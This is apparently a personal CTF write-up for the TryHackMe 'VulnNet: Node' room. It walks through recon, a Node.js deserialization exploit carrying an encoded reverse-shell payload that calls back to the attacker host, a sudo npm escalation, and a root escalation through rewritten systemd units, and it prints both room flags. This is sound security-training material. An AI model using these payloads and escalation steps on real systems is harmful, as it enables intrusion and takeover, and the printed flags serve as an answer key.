<h1 align="center">VulnNet: Node</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/35ca8405-891e-4442-b58f-af59c08e7a86"><br>
<p align="center">July 8, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, 
and I’m excited to join you on this adventure, part of my <code>428</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>After the previous breach, VulnNet Entertainment states it won't happen again. Can you prove they're wrong</em>?<br>
Access it <a href="https://tryhackme.com/room/vulnnetnode"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/abfc5f93-69b3-4893-9344-485cef4c5015"></p>

<br>

<h2>Task 1 . Intoduction</h2>
<p>VulnNet Entertainment has moved its infrastructure and now they're confident that no breach will happen again. You're tasked to prove otherwise and penetrate their network.<br>

- Difficulty: Easy<br>
- Web Language: JavaScript<br>

This is again an attempt to recreate some more realistic scenario but with techniques packed into a single machine. Good luck!<br>

Icon made by Freepik from www.flaticon.com<br>
<p><em>Answer the questions below</em></p>

<p>1.1. <em>What is the user flag? (user.txt)</em><br>
<code>THM{064640a2f880ce9ed7a54886f1bde821}</code></p>

<h3>nmap</h3>

```bash
:~/VulnNetNode# nmap -sC -sV -p- -T4 TargetIP
...
PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
```

<h3>gobuster</h3>

```bash
:~/VulnNetNode# gobuster dir -u http://TargetIP4:8080/ -w /usr/share/dirb/wordlists/common.txt
...
/css                  (Status: 301) [Size: 173] [--> /css/]
/img                  (Status: 301) [Size: 173] [--> /img/]
/Login                (Status: 200) [Size: 2127]
/login                (Status: 200) [Size: 2127]
```

![image](https://github.com/user-attachments/assets/3176126b-5079-4938-8900-2d29f577ec5f)

<br>

<h3>TargetIP:8080</h3>

![image](https://github.com/user-attachments/assets/b1e6cb31-449a-43d4-9871-83bd3f7e0c13)


<h3>Target:8080/login</h3>

<p><code>researcher@mail.com</code>:<code>pass</code></p>

<h3>Burp Suite & FoxyProxy</h3>

![image](https://github.com/user-attachments/assets/57f4f7c8-7a17-4589-9904-1f70b44c3ed6)

![image](https://github.com/user-attachments/assets/430d6ed1-de5d-4694-af58-5ff546646255)


<h3>nodejsshell.py</h3>

```bash
:~/VulnNetNode# wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/refs/heads/master/nodejsshell.py
...
~# python nodejsshell.py AttackIP 4444
[+] LHOST = AttackIP
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,50,49,48,46,56,56,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

```bash
{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10 .... 10))}()"}
```

<h3>Encode Base64</h3>

```bash
eyJyY2UiOiJfJCRORF ....LDg0LDQxLDU5LDEwKSl9KCkifQ==
```

![image](https://github.com/user-attachments/assets/187865c6-5d41-4bf4-b1e9-ebe8c1579234)


<h3>Burp Suite Repeater</h3>

![image](https://github.com/user-attachments/assets/036385cd-3bc7-436d-9d29-6389860e81f6)


<h3>shell</h3>

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.228.176 43076
Connected!
whoami
www
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
www@vulnnet-node:~/VulnNet-Node$ ^Z
[1]+  Stopped                 nc -nlvp 4444
root@ip-10-10-210-88:~# stty raw -echo; fg
nc -nlvp 4444

www@vulnnet-node:~/VulnNet-Node$ pwd
/home/www/VulnNet-Node
www@vulnnet-node:~/VulnNet-Node$ cd /home
www@vulnnet-node:/home$ ls
serv-manage  www
```

```bash
www@vulnnet-node:/home$ cd serv-manage
bash: cd: serv-manage: Permission denied
```

```bash
www@vulnnet-node:/home$ cd serv-manage
bash: cd: serv-manage: Permission denied
```

```bash
www@vulnnet-node:~/VulnNet-Node$ sudo -l
Matching Defaults entries for www on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

<p>https://gtfobins.github.io/gtfobins/npm/</p>

![image](https://github.com/user-attachments/assets/430004a7-78a8-4683-9b45-05af5ff30ac3)


```bash
ww@vulnnet-node:~/VulnNet-Node$ mkdir /dev/shm/rosana
www@vulnnet-node:~/VulnNet-Node$ TF=/dev/shm/rosana
 $TF/package.json~/VulnNet-Node$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > 
e-perm inet-node:~/VulnNet-Node$ sudo -u serv-manage /usr/bin/npm -C $TF --unsafe

> @ preinstall /dev/shm/rosana
> /bin/sh

$ whoami
serv-manage
$ 
```


```bash
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
serv-manage@vulnnet-node:/dev/shm/rosana$ 
```

```bash
serv-manage@vulnnet-node:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
serv-manage@vulnnet-node:~$ cat user.txt
THM{064640a2f880ce9ed7a54886f1bde821}
```

<br>
<br>

```bash
serv-manage@vulnnet-node:~$ sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```


```bash
serv-manage@vulnnet-node:~$ systemctl status vulnnet-auto.timer
\u25cf vulnnet-auto.timer - Run VulnNet utilities every 30 min
   Loaded: loaded (/etc/systemd/system/vulnnet-auto.timer; disabled; vendor pres
   Active: inactive (dead)
  Trigger: n/a

serv-manage@vulnnet-node:~$ ls -la /etc/systemd/system/vulnnet-auto.timer
-rw-rw-r-- 1 root serv-manage 167 Jan 24  2021 /etc/systemd/system/vulnnet-auto.timer
```

```bash
serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-auto.timer
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```

<br>
<br>


<p>1.2. <em>What is the root flag? (root.txt)</em><br>
<code>THM{abea728f211b105a608a720a37adabf9}</code></p>

<br>

```bash
serv-manage@vulnnet-node:~$ systemctl status vulnnet-job.service
\u25cf vulnnet-job.service - Logs system statistics to the systemd journal
   Loaded: loaded (/etc/systemd/system/vulnnet-job.service; disabled; vendor pre
   Active: inactive (dead)
lines 1-3/3 (END)
```

```bash
serv-manage@vulnnet-node:~$ ls -la /etc/systemd/system/vulnnet-job.service
-rw-rw-r-- 1 root serv-manage 197 Jan 24  2021 /etc/systemd/system/vulnnet-job.service
```

```bash
serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```

```bash
serv-manage@vulnnet-node:~$ find / -uid 0 -perm -4000 -type f 2>/dev/null
/bin/su
/bin/ping
/bin/fusermount
/bin/umount
/bin/ntfs-3g
/bin/mount
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/local/bin/sudo
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/sudo
```

<br>

```bash
serv-manage@vulnnet-node:~$ sudo /bin/systemctl stop vulnnet-auto.timer
```

<br>

```bash
serv-manage@vulnnet-node:~$ nano /etc/systemd/system/vulnnet-job.service
```

```bash
echo '[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/bashroot;chmod +xs /tmp/bashroot'

[Install]
WantedBy=multi-user.target
```

```bash
serv-manage@vulnnet-node:~$ nano /etc/systemd/system/vulnnet-auto.timer
```

```bash
serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-auto.timer
echo '[Unit]
Description=Run VulnNet utilities every 1 min
[Timer]
OnBootSec=0min
# 1 min job
OnCalendar=*:0/1
Unit=vulnnet-job.service
[Install]
WantedBy=basic.target
```

<br>


```bash
serv-manage@vulnnet-node:~$ serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$  sudo /bin/systemctl daemon-reload
serv-manage@vulnnet-node:~$ serv-manage@vulnnet-node:/tmp/tmp.DHRcCalyiZ$   sudo /bin/systemctl start vulnnet-auto.timer
```

<p> ... and after a while ...</p>

```bash
serv-manage@vulnnet-node:~$ /tmp/bashroot -p
bashroot-4.4# cat /root/root.txt
THM{abea728f211b105a608a720a37adabf9}
```


<br>

<h1 align="center">Room Completed</h1>
<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/c7eda947-95f8-464c-9da1-823bf8f267f1"><br>
<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/ca1f8558-f141-4b01-8c1a-906c3926dd70"><br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 8, 2025      | 428      |     163ʳᵈ    |      5ᵗʰ     |     889ᵗʰ   |    22nd    |  113,405 |    835    |     64   |

</div>

<p align="center"> Global All Time: 163ʳᵈ <br><img width="300px" src="https://github.com/user-attachments/assets/21266c02-b395-41a3-a2eb-25bc583b06b9" alt="Your Image Badge"><br>
                                              <img width="1000px" src="https://github.com/user-attachments/assets/72e58bdc-39cc-4ded-b87d-9bc05b9a10ef"><br><br>
                   Brazil All Time:   5ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/6dd61836-7b29-4b2f-bf67-bea99c669be5"><br><br>
                   Global monthly: 889ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/85735e8b-a7b2-4fab-a5b7-ef878c269654"><br><br>
                   Brazil monthly:   22nd<br><img width="1000px" src="https://github.com/user-attachments/assets/cd4a5538-2f36-4cb4-b004-f138653ff08b"><br><br></p>
